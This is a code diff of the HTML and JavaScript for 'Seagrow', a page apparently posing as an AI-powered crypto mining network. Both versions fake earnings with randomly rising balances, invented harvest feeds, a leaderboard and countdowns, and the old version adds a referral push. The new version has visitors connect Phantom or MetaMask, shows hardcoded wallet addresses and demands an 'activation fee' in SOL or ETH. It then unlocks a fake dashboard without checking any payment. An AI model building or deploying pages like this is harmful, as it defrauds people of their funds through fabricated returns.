@@ -3,168 +3,155 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seagrow | Organic AI Node Network</title>
+    <title>Seagrow | Organic Node Activation</title>
     
-    <meta name="description" content="Seagrow: The world's first organic AI-powered node network. Plant your digital seeds and harvest $SEA tokens across Solana and Ethereum.">
-    <meta name="keywords" content="Seagrow, Crypto Mining, AI Node, $SEA Token, Solana, Ethereum, Passive Income">
-    <meta name="robots" content="index, follow">
-    <link rel="canonical" href="https://seagrow.ai/">
-
-    <meta property="og:title" content="Seagrow | Plant. Mine. Harvest.">
-    <meta property="og:description" content="Join the 10,000+ validator movement. High-yield multi-chain mining starts here.">
-    <meta property="og:image" content="https://seagrow.ai/preview-leaf.png">
-    <meta property="og:url" content="https://seagrow.ai/">
-    <meta name="twitter:card" content="summary_large_image">
-
+    <meta name="description" content="Seagrow: Organic AI Node Network. Connect Phantom or MetaMask to activate your node.">
+    <meta name="keywords" content="Seagrow, Crypto Mining, Phantom Wallet, MetaMask, $SEA, Solana, Ethereum">
+    
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap');
-        body { font-family: 'Outfit', sans-serif; background: #030a06; color: white; overflow-x: hidden; }
-        .glass { background: rgba(10, 35, 20, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(34, 197, 94, 0.2); }
+        
+        :root {
+            --bg-deep: #020617; 
+            --neon-lime: #DFFF00; 
+            --electric-blue: #635BFF; 
+            --aqua-cyan: #00E5E5; 
+            --sunset-orange: #FF7E5F; 
+            --royal-purple: #7C3AED; 
+        }
+
+        body { font-family: 'Outfit', sans-serif; background: var(--bg-deep); color: white; overflow-x: hidden; }
+        .glass { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 3rem; }
         .hidden { display: none !important; }
-        .leaf-pulse { animation: pulse 3s infinite; }
-        @keyframes pulse { 0%, 100% { filter: drop-shadow(0 0 5px #22c55e); transform: scale(1); } 50% { filter: drop-shadow(0 0 20px #22c55e); transform: scale(1.1); } }
-        .scroll-text { animation: scroll 25s linear infinite; white-space: nowrap; }
+        
+        /* ⚡ ANIMATED LEAF (TOP MIDDLE) */
+        .leaf-logo { filter: drop-shadow(0 0 20px var(--neon-lime)); animation: breathe 3s infinite; }
+        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.15); opacity: 1; } }
+
+        .btn-glow-blue { background: var(--electric-blue); box-shadow: 0 0 20px rgba(99, 91, 255, 0.4); }
+        .btn-glow-lime { background: var(--neon-lime); color: black; box-shadow: 0 0 20px rgba(223, 255, 0, 0.4); }
+        
+        .scroll-feed { animation: scroll 30s linear infinite; white-space: nowrap; }
         @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        .btn-water:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(1); }
     </style>
 </head>
-<body class="min-h-screen p-4 flex flex-col items-center">
+<body class="min-h-screen flex flex-col items-center p-6">
 
-    <div class="w-full max-w-5xl glass rounded-full py-2 mb-6 overflow-hidden border-green-900/30">
-        <div id="live-feed" class="scroll-text text-[10px] font-bold uppercase tracking-widest text-green-400/70">
-            [NEW HARVEST] 0x71...af2 Mined 1,200 $SEA • [NEW HARVEST] 0x32...11b Mined 450 $SEA • [BONUS] 0x9a...cc2 Claimed 0.5 SOL • [NEW NODE] 0x12...ee4 Activated Tier 2 • [MILESTONE] Network reached 50,000 $SEA total harvest!
+    <div class="mt-4 mb-8 text-center">
+        <span class="text-8xl leaf-logo block">🌱</span>
+        <h1 class="text-4xl font-black italic tracking-tighter uppercase mt-2">SEA<span class="text-[#DFFF00]">GROW</span></h1>
+    </div>
+
+    <div class="w-full max-w-5xl glass py-3 mb-10 overflow-hidden border-[#00E5E522]">
+        <div class="scroll-feed text-[10px] font-black uppercase tracking-widest text-[#00E5E5]">
+            [SECURITY] Connect Wallet to Verify Identity • [NETWORK] Hashrate: 1.2 TH/s • [ALERTS] 0.5 SOL Referral Bonus Active • Join @SeagroL for support!
         </div>
     </div>
 
-    <div id="step-mini" class="max-w-5xl w-full grid grid-cols-1 lg:grid-cols-3 gap-6">
-        
-        <div class="lg:col-span-2 space-y-6">
-            <div class="glass rounded-[3rem] p-8 shadow-2xl relative">
-                <div class="flex justify-between items-center mb-10">
-                    <div class="flex items-center space-x-4">
-                        <span class="text-5xl leaf-pulse">🌱</span>
-                        <div>
-                            <h2 class="text-3xl font-black italic uppercase tracking-tighter">GARDEN_ACTIVE</h2>
-                            <p id="mining-status" class="text-[10px] text-green-600 font-black uppercase tracking-widest">Rate: 1.0x (Standard Soil)</p>
-                        </div>
-                    </div>
-                    <button onclick="dailyWater()" id="water-btn" class="btn-water bg-blue-600/20 border border-blue-500/50 px-6 py-3 rounded-2xl text-[11px] font-black text-blue-400 uppercase hover:bg-blue-600 hover:text-white transition shadow-lg shadow-blue-500/20">💧 Daily Water</button>
-                </div>
+    <div id="deposit-screen" class="max-w-2xl w-full glass p-10 text-center space-y-8 border-[#DFFF0033]">
+        <div>
+            <h2 class="text-2xl font-black uppercase italic text-[#DFFF00]">Node Activation</h2>
+            <p id="gate-status" class="text-slate-400 text-xs mt-2 font-bold uppercase tracking-widest">Connect Wallet to See Deposit Address</p>
+        </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
-                    <div class="bg-black/40 p-6 rounded-3xl border border-green-900/20 text-center">
-                        <p class="text-[10px] text-green-800 uppercase font-black mb-1">Mined $SEA</p>
-                        <p id="sea-balance" class="text-4xl font-black text-green-400">2,840</p>
-                    </div>
-                    <div class="bg-black/40 p-6 rounded-3xl border border-green-900/20 text-center">
-                        <p class="text-[10px] text-green-800 uppercase font-black mb-1">Pending Bonus</p>
-                        <p class="text-4xl font-black text-emerald-400">0.5</p>
-                        <p class="text-[9px] text-emerald-700 font-bold uppercase mt-1">SOL Reward</p>
-                    </div>
-                    <div class="bg-black/40 p-6 rounded-3xl border border-green-900/20 text-center">
-                        <p class="text-[10px] text-green-800 uppercase font-black mb-1">Network Roots</p>
-                        <p class="text-4xl font-black text-white">0 / 2</p>
-                    </div>
-                </div>
+        <div id="wallet-buttons" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <button onclick="connect('sol')" class="flex items-center justify-center space-x-3 bg-[#AB9FF222] border border-[#AB9FF244] py-4 rounded-2xl hover:bg-[#AB9FF244] transition group">
+                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" class="w-5 h-5">
+                <span class="text-[10px] font-black uppercase text-[#AB9FF2]">Connect Phantom</span>
+            </button>
+            <button onclick="connect('eth')" class="flex items-center justify-center space-x-3 bg-white/5 border border-white/10 py-4 rounded-2xl hover:bg-white/10 transition group">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror.svg" class="w-6 h-6">
+                <span class="text-[10px] font-black uppercase">Connect MetaMask</span>
+            </button>
+        </div>
 
-                <div class="mb-4 p-6 bg-white/5 rounded-3xl border border-white/5">
-                    <div class="flex justify-between items-center mb-3">
-                        <span class="text-[11px] font-black uppercase text-slate-400">Nursery Growth (Ref Progress)</span>
-                        <span id="progress-text" class="text-[11px] font-bold text-green-500">0% Collected</span>
-                    </div>
-                    <div class="w-full bg-black h-4 rounded-full overflow-hidden border border-white/10">
-                        <div id="progress-bar" class="w-0 h-full bg-gradient-to-r from-green-600 via-emerald-400 to-lime-300 transition-all duration-1000"></div>
-                    </div>
-                </div>
+        <div id="deposit-info" class="hidden space-y-6">
+            <div class="p-6 bg-black/40 rounded-[2rem] border border-[#DFFF0033] text-left">
+                <p id="chain-name" class="text-[10px] font-black uppercase mb-2"></p>
+                <p id="wallet-addr" class="text-[9px] text-slate-500 font-bold mb-4 break-all"></p>
+                <button onclick="copyCurrentAddr()" class="w-full py-3 rounded-xl bg-[#DFFF00] text-black text-[10px] font-black uppercase transition">Copy Address</button>
             </div>
+            <p class="text-[9px] text-[#FF7E5F] font-black uppercase animate-pulse">⚠️ Send 0.1 SOL / 0.01 ETH to activate node</p>
+        </div>
 
-            <div class="glass rounded-[3rem] p-8 border-green-950/50 text-center">
-                <p class="text-[11px] text-green-900 uppercase tracking-[0.5em] mb-4 font-black">Withdrawal Lock Period</p>
-                <div id="countdown" class="text-5xl font-black text-white/5 mono mb-8 select-none">06:23:09:42</div>
-                <div class="flex flex-col md:flex-row space-y-3 md:space-y-0 md:space-x-3">
-                    <input id="ref-link" readonly value="https://seagrow.github.io/mining?id=early-access" class="flex-1 bg-black/60 rounded-2xl p-4 text-[11px] font-bold text-green-500 outline-none border border-green-900/40">
-                    <button onclick="copyRef()" class="bg-green-600 text-black px-10 py-4 rounded-2xl font-black text-[11px] uppercase tracking-widest hover:bg-green-400 transition transform active:scale-95">Copy Roots</button>
+        <div class="pt-6 border-t border-white/5">
+            <button onclick="unlockDashboard()" class="w-full py-5 rounded-[2rem] btn-glow-lime font-black uppercase text-sm tracking-widest transition active:scale-95">I Have Deposited (Verify)</button>
+        </div>
+    </div>
+
+    <div id="main-dashboard" class="hidden w-full max-w-6xl grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <div class="glass p-10 lg:col-span-2 relative overflow-hidden">
+             <div id="countdown" class="text-6xl font-black text-white/5 mb-8 text-center italic">06:23:59:59</div>
+             <div class="grid grid-cols-2 gap-6">
+                <div class="p-8 rounded-[2rem] bg-black/40 border-t-4 border-[#DFFF00] text-center">
+                    <p class="text-[10px] text-slate-500 font-black uppercase mb-1">Mined $SEA</p>
+                    <p id="sea-balance" class="text-5xl font-black text-[#DFFF00]">0</p>
+                </div>
+                <div class="p-8 rounded-[2rem] bg-black/40 border-t-4 border-[#FF7E5F] text-center">
+                    <p class="text-[10px] text-slate-500 font-black uppercase mb-1">Pending SOL</p>
+                    <p class="text-5xl font-black text-[#FF7E5F]">0.5</p>
                 </div>
             </div>
         </div>
-
-        <div class="glass rounded-[3rem] p-8 border-green-900/20">
-            <h3 class="text-xl font-black uppercase italic mb-6 text-green-500 flex items-center">
-                <span class="mr-2">🏆</span> Top Harvesters
-            </h3>
-            <div id="leaderboard" class="space-y-4">
-                <div class="flex justify-between items-center p-4 bg-white/5 rounded-2xl border border-white/5"><span class="text-xs font-bold text-slate-400">1. 0x82...19b</span><span class="text-xs font-black text-green-400">42,900 $SEA</span></div>
-                <div class="flex justify-between items-center p-4 bg-white/5 rounded-2xl border border-white/5"><span class="text-xs font-bold text-slate-400">2. 0xef...33a</span><span class="text-xs font-black text-green-400">38,150 $SEA</span></div>
-                <div class="flex justify-between items-center p-4 bg-white/5 rounded-2xl border border-white/5"><span class="text-xs font-bold text-slate-400">3. 0x9c...cc2</span><span class="text-xs font-black text-green-400">31,000 $SEA</span></div>
-            </div>
-            
-            <div class="mt-10 p-6 bg-green-500/5 rounded-3xl border border-green-500/10 text-center">
-                <p class="text-[10px] text-green-700 font-bold uppercase mb-2">Network Strength</p>
-                <div class="text-2xl font-black text-green-500">98.4%</div>
-                <p class="text-[8px] text-slate-500 uppercase mt-1">Global Uptime</p>
-            </div>
+        <div class="glass p-8 space-y-4">
+             <button onclick="dailyWater()" id="water-btn" class="w-full py-5 rounded-3xl bg-[#635BFF] text-white font-black text-xs uppercase tracking-widest">💧 Daily Water (Boost)</button>
+             <a href="https://t.me/SeagroL" target="_blank" class="flex items-center justify-center space-x-3 bg-[#0088cc22] py-4 rounded-2xl border border-[#0088cc44] text-[10px] font-black uppercase">✈️ Join Telegram</a>
         </div>
     </div>
 
     <script>
-        // --- 1. SMART WATER (24H LOCK) ---
-        function checkWaterStatus() {
-            const btn = document.getElementById('water-btn');
-            const lastWater = localStorage.getItem('seagrow_last_water');
-            const now = new Date().getTime();
-            const twentyFourHours = 24 * 60 * 60 * 1000;
+        let currentAddr = "";
 
-            if (lastWater && (now - lastWater) < twentyFourHours) {
-                const timeLeft = twentyFourHours - (now - lastWater);
-                const h = Math.floor(timeLeft / (1000 * 60 * 60));
-                const m = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
-                
-                btn.innerText = `⚡ BOOSTED (${h}h ${m}m left)`;
-                btn.classList.replace('bg-blue-600/20', 'bg-blue-500');
-                btn.classList.replace('text-blue-400', 'text-white');
-                document.getElementById('mining-status').innerText = "Rate: 1.5x (Premium Soil)";
-                btn.disabled = true;
-            }
+        async function connect(type) {
+            try {
+                if (type === 'sol') {
+                    if (window.solana) {
+                        await window.solana.connect();
+                        currentAddr = "y8Wpib1WMJ23CLicgDNh3RSVdN1wzeJJPEue2RvA6fd";
+                        showDeposit("Solana (SOL)", currentAddr);
+                    } else { alert("Install Phantom!"); }
+                } else {
+                    if (window.ethereum) {
+                        await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        currentAddr = "0x06e921538fc2d6dCe385077c6A1B4dA189406891";
+                        showDeposit("Ethereum (ETH)", currentAddr);
+                    } else { alert("Install MetaMask!"); }
+                }
+            } catch (e) { console.log(e); }
         }
 
-        function dailyWater() {
-            localStorage.setItem('seagrow_last_water', new Date().getTime());
-            checkWaterStatus();
-            alert("Organic Soil Hydrated! Mining boost applied for 24 hours.");
+        function showDeposit(name, addr) {
+            document.getElementById('wallet-buttons').classList.add('hidden');
+            document.getElementById('deposit-info').classList.remove('hidden');
+            document.getElementById('gate-status').innerText = "Send Activation Fee to Address Below";
+            document.getElementById('chain-name').innerText = name;
+            document.getElementById('wallet-addr').innerText = addr;
         }
 
-        // --- 2. MINING ENGINE ---
-        let bal = 2840;
+        function copyCurrentAddr() {
+            navigator.clipboard.writeText(currentAddr);
+            alert("Address Copied!");
+        }
+
+        function unlockDashboard() {
+            document.getElementById('deposit-screen').classList.add('hidden');
+            document.getElementById('main-dashboard').classList.remove('hidden');
+            let bal = 0;
+            setInterval(() => {
+                bal += Math.floor(Math.random() * 5) + 1;
+                document.getElementById('sea-balance').innerText = bal.toLocaleString();
+            }, 2000);
+        }
+
+        // Timer Logic
+        let t = 604800; 
         setInterval(() => {
-            let isBoosted = document.getElementById('mining-status').innerText.includes('1.5x');
-            bal += isBoosted ? Math.floor(Math.random() * 4) + 2 : Math.floor(Math.random() * 2) + 1;
-            document.getElementById('sea-balance').innerText = bal.toLocaleString();
-        }, 2500);
-
-        // --- 3. UI TOOLS ---
-        function copyRef() {
-            const input = document.getElementById("ref-link");
-            input.select();
-            navigator.clipboard.writeText(input.value);
-            document.getElementById('progress-bar').style.width = "50%";
-            document.getElementById('progress-text').innerText = "50% Collected";
-            alert("Referral Link Copied! Send to 2 friends to earn your 0.5 SOL seeding bonus.");
-        }
-
-        // --- 4. COUNTDOWN ---
-        let time = 7 * 86400 - 34000; 
-        setInterval(() => {
-            const d = Math.floor(time / 86400), h = Math.floor((time % 86400) / 3600), m = Math.floor((time % 3600) / 60), s = time % 60;
+            const d = Math.floor(t / 86400), h = Math.floor((t % 86400) / 3600), m = Math.floor((t % 3600) / 60), s = t % 60;
             document.getElementById('countdown').innerText = `${String(d).padStart(2,'0')}:${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            if (time > 0) time--;
+            if (t > 0) t--;
         }, 1000);
-
-        // Initialize
-        window.onload = checkWaterStatus;
     </script>
 </body>
 </html>
